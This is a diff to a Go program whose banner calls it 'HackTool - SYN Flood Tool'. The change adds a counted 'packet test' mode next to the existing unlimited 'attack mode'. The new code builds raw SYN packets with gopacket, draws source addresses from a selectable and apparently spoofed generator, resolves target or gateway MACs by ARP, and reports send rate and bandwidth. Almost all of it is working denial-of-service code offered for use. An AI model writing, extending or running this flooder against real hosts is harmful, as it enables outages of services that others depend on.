@@ -511,15 +511,250 @@ func sendSynPackets(targetIP string, targetPort uint16, workerCount int, userIfa
 	fmt.Printf("\n\n已停止，共发送 %d 个 SYN 包，错误 %d 次\n", total, totalErr)
 }
 
+// testConfig 保存发包测试模式的配置，便于循环复用与修改
+type testConfig struct {
+	targetIP    string
+	targetPort  uint16
+	packetCount int
+	iface       *ifaceInfo
+	srcMode     sourceIPMode
+	customIP    string
+}
+
+// readLine 打印提示并读取一行输入（去除首尾空白）
+func readLine(prompt string) string {
+	if prompt != "" {
+		fmt.Print(prompt)
+	}
+	var s string
+	fmt.Scanln(&s)
+	return strings.TrimSpace(s)
+}
+
+// readIntDefault 读取整数，空输入或非法输入时返回默认值
+func readIntDefault(prompt string, def int) int {
+	s := readLine(prompt)
+	if s == "" {
+		return def
+	}
+	var v int
+	if _, err := fmt.Sscanf(s, "%d", &v); err != nil {
+		fmt.Println("[警告] 无效数字，保持原值")
+		return def
+	}
+	return v
+}
+
+// editInteractive 交互式修改配置，直接回车保持原值
+func (c *testConfig) editInteractive() {
+	fmt.Println("\n===== 修改发包配置 (直接回车保持原值) =====")
+
+	if s := readLine(fmt.Sprintf("目标 IP [%s]: ", c.targetIP)); s != "" {
+		if net.ParseIP(s) != nil {
+			c.targetIP = s
+		} else {
+			fmt.Println("[警告] 无效 IP，保持原值")
+		}
+	}
+
+	p := readIntDefault(fmt.Sprintf("目标端口 [%d]: ", c.targetPort), int(c.targetPort))
+	if p > 0 && p <= 65535 {
+		c.targetPort = uint16(p)
+	} else {
+		fmt.Println("[警告] 端口范围应为 1-65535，保持原值")
+	}
+
+	n := readIntDefault(fmt.Sprintf("发包数量 [%d]: ", c.packetCount), c.packetCount)
+	if n > 0 {
+		c.packetCount = n
+	} else {
+		fmt.Println("[警告] 数量必须大于 0，保持原值")
+	}
+
+	if strings.EqualFold(readLine("是否重新选择网卡/源IP模式? (y/N): "), "y") {
+		if iface := selectInterfaceInteractive(); iface != nil {
+			c.iface = iface
+		}
+		c.srcMode, c.customIP = selectSourceIPMode()
+	}
+}
+
+// sendPacketTest 发包测试模式：发送指定数量的 SYN 包，并输出统计结果
+func sendPacketTest(targetIP string, targetPort uint16, packetCount int, userIface *ifaceInfo, srcMode sourceIPMode, customIP string) {
+	parsedTargetIP := net.ParseIP(targetIP)
+
+	// ===== 统一选择网卡 =====
+	var iface *ifaceInfo
+	var err error
+	if userIface != nil {
+		iface = userIface
+		fmt.Printf("[信息] 使用指定网卡: %s\n", iface.Name)
+	} else {
+		iface, err = selectInterface(parsedTargetIP)
+		if err != nil {
+			log.Fatal("Failed to select interface: ", err)
+		}
+	}
+	fmt.Printf("[信息] 网卡:   %s\n", iface.Name)
+	fmt.Printf("[信息] 本机 IP:  %s\n", iface.IP)
+	fmt.Printf("[信息] 本机 MAC: %s\n", iface.MAC)
+	fmt.Printf("[信息] 子网掩码: %s\n", iface.Mask)
+
+	// ===== 初始化源IP生成器 =====
+	srcGen := newSourceIPGenerator(srcMode, customIP, iface)
+
+	// ===== 确定目的 MAC =====
+	var dstMAC net.HardwareAddr
+	if iface.Mask != nil && iface.IP.Mask(iface.Mask).Equal(parsedTargetIP.Mask(iface.Mask)) {
+		fmt.Printf("[信息] 目标 %s 在同一子网，ARP 解析目标 MAC...\n", targetIP)
+		dstMAC, err = resolveMACByARP(targetIP)
+		if err != nil {
+			log.Fatal("Failed to resolve target MAC: ", err)
+		}
+	} else {
+		gateway, gwErr := getDefaultGateway()
+		if gwErr != nil {
+			log.Fatal("Failed to get default gateway: ", gwErr)
+		}
+		fmt.Printf("[信息] 目标 %s 不在同一子网，通过网关 %s 转发...\n", targetIP, gateway)
+		dstMAC, err = resolveMACByARP(gateway)
+		if err != nil {
+			log.Fatal("Failed to resolve gateway MAC: ", err)
+		}
+	}
+	fmt.Printf("[信息] 目的 MAC: %s\n", dstMAC)
+
+	// ===== 初始化发包器 =====
+	sender, psErr := newPacketSender(iface.Name)
+	if psErr != nil {
+		log.Fatalf("Failed to init packet sender: %v", psErr)
+	}
+	defer sender.Close()
+
+	// ===== 监听 Ctrl+C，允许提前中断 =====
+	sigChan := make(chan os.Signal, 1)
+	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
+	defer signal.Stop(sigChan)
+	stopFlag := int32(0)
+	done := make(chan struct{})
+	defer close(done)
+	go func() {
+		select {
+		case <-sigChan:
+			atomic.StoreInt32(&stopFlag, 1)
+		case <-done:
+		}
+	}()
+
+	var sentCount uint64
+	var errCount uint64
+	startTime := time.Now()
+
+	fmt.Printf("\n开始发送 %d 个 SYN 包，按 Ctrl+C 可提前停止...\n\n", packetCount)
+
+	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
+	buf := gopacket.NewSerializeBuffer()
+	options := gopacket.SerializeOptions{
+		FixLengths:       true,
+		ComputeChecksums: true,
+	}
+
+	for i := 0; i < packetCount; i++ {
+		if atomic.LoadInt32(&stopFlag) != 0 {
+			break
+		}
+
+		srcIP := srcGen.next(rng)
+		srcPort := uint16(rng.Intn(65535))
+
+		ethLayer := layers.Ethernet{
+			SrcMAC:       iface.MAC,
+			DstMAC:       dstMAC,
+			EthernetType: layers.EthernetTypeIPv4,
+		}
+		ipLayer := layers.IPv4{
+			Version:  4,
+			IHL:      5,
+			TTL:      64,
+			Protocol: layers.IPProtocolTCP,
+			SrcIP:    net.ParseIP(srcIP),
+			DstIP:    parsedTargetIP,
+		}
+		tcpLayer := layers.TCP{
+			SrcPort:    layers.TCPPort(srcPort),
+			DstPort:    layers.TCPPort(targetPort),
+			Seq:        rng.Uint32(),
+			DataOffset: 5,
+			Window:     5840,
+			SYN:        true,
+		}
+		tcpLayer.SetNetworkLayerForChecksum(&ipLayer)
+
+		buf.Clear()
+		if serErr := gopacket.SerializeLayers(buf, options, &ethLayer, &ipLayer, &tcpLayer); serErr != nil {
+			atomic.AddUint64(&errCount, 1)
+			continue
+		}
+
+		if sendErr := sender.Send(buf.Bytes()); sendErr != nil {
+			atomic.AddUint64(&errCount, 1)
+			continue
+		}
+		atomic.AddUint64(&sentCount, 1)
+
+		// 每 100 个包或最后一个包刷新一次进度
+		if (i+1)%100 == 0 || i == packetCount-1 {
+			elapsed := time.Since(startTime)
+			pps := float64(i+1) / elapsed.Seconds()
+			fmt.Printf("\r[进度] %d/%d | 速率: %.1f pps | 错误: %d    ",
+				i+1, packetCount, pps, atomic.LoadUint64(&errCount))
+		}
+	}
+
+	total := atomic.LoadUint64(&sentCount)
+	totalErr := atomic.LoadUint64(&errCount)
+	elapsed := time.Since(startTime)
+	var pps, bandwidth float64
+	if elapsed.Seconds() > 0 {
+		pps = float64(total) / elapsed.Seconds()
+		bandwidth = float64(total*54) / 1024.0 / 1024.0 * 8 / elapsed.Seconds()
+	}
+
+	fmt.Printf("\n\n========== 发包测试结果 ==========\n")
+	fmt.Printf("成功发送: %d\n", total)
+	fmt.Printf("失败次数: %d\n", totalErr)
+	fmt.Printf("耗时:     %.2f 秒\n", elapsed.Seconds())
+	fmt.Printf("平均速率: %.1f pps\n", pps)
+	fmt.Printf("平均带宽: %.3f Mbps\n", bandwidth)
+	fmt.Println("===================================")
+}
+
 func main() {
 	var targetIP string
 	var targetPort int
 	var workerCount int
+	var packetCount int
+
+	fmt.Println("========================================")
+	fmt.Println("       HackTool - SYN Flood Tool")
+	fmt.Println("========================================")
+	fmt.Println("请选择模式:")
+	fmt.Println("  1. 持续攻击模式 (无限发包，Ctrl+C 停止)")
+	fmt.Println("  2. 发包测试模式 (发送指定数量的包)")
+	fmt.Print("请选择模式 [1-2] (默认 1): ")
+
+	var modeInput string
+	fmt.Scanln(&modeInput)
+	modeInput = strings.TrimSpace(modeInput)
+	testMode := modeInput == "2"
 
 	fmt.Print("请输入目标 IP: ")
 	fmt.Scanln(&targetIP)
 	if targetIP == "" {
 		log.Fatal("目标 IP 不能为空")
+	}
+	if net.ParseIP(targetIP) == nil {
+		log.Fatal("无效的目标 IP 地址")
 	}
 
 	fmt.Print("请输入目标端口: ")
@@ -528,14 +763,22 @@ func main() {
 		log.Fatal("端口范围: 1-65535")
 	}
 
-	fmt.Print("请输入并发 worker 数量 (建议 1-32): ")
-	fmt.Scanln(&workerCount)
-	if workerCount <= 0 {
-		workerCount = 1
-	}
-	if workerCount > 128 {
-		fmt.Println("[警告] worker 数量过大，已限制为 128")
-		workerCount = 128
+	if testMode {
+		fmt.Print("请输入要发送的包数量: ")
+		fmt.Scanln(&packetCount)
+		if packetCount <= 0 {
+			log.Fatal("包数量必须大于 0")
+		}
+	} else {
+		fmt.Print("请输入并发 worker 数量 (建议 1-32): ")
+		fmt.Scanln(&workerCount)
+		if workerCount <= 0 {
+			workerCount = 1
+		}
+		if workerCount > 128 {
+			fmt.Println("[警告] worker 数量过大，已限制为 128")
+			workerCount = 128
+		}
 	}
 
 	// 交互式选择网卡
@@ -544,5 +787,33 @@ func main() {
 	// 交互式选择源IP模式
 	srcMode, customIP := selectSourceIPMode()
 
-	sendSynPackets(targetIP, uint16(targetPort), workerCount, selectedIface, srcMode, customIP)
+	if testMode {
+		cfg := &testConfig{
+			targetIP:    targetIP,
+			targetPort:  uint16(targetPort),
+			packetCount: packetCount,
+			iface:       selectedIface,
+			srcMode:     srcMode,
+			customIP:    customIP,
+		}
+		for {
+			sendPacketTest(cfg.targetIP, cfg.targetPort, cfg.packetCount, cfg.iface, cfg.srcMode, cfg.customIP)
+
+			fmt.Println("\n===== 测试完成，请选择下一步 =====")
+			fmt.Println("  1. 再次发包 (使用相同配置)")
+			fmt.Println("  2. 修改配置后发包")
+			fmt.Println("  3. 退出")
+			switch readLine("请选择 [1-3]: ") {
+			case "2":
+				cfg.editInteractive()
+			case "3":
+				fmt.Println("已退出。")
+				return
+			default:
+				// "1" 或其他输入：使用相同配置再次发包
+			}
+		}
+	} else {
+		sendSynPackets(targetIP, uint16(targetPort), workerCount, selectedIface, srcMode, customIP)
+	}
 }
